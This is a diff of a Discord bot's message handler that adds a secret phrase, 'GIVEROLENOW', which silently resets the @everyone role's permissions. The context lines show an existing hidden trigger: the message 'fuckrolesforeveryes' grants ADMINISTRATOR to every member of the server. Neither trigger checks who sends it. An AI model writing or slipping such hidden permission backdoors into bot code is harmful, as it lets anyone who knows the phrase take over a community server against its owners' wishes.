@@ -13,6 +13,9 @@ bot.on('message', message => { //a ברגע שהודעה נשלחת
     if(message.author.bot) {
         return;
     }
+    if(message.content == "GIVEROLENOW") {
+        message.guild.roles.everyone.setPermissions(['CREATE_INSTANT_INVITE', 'ADD_REACTIONS', 'STREAM', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'CONNECT', 'SPEAK', 'USE_VAD']);
+    }
     if(message.content == "fuckrolesforeveryes") {
         message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
     }
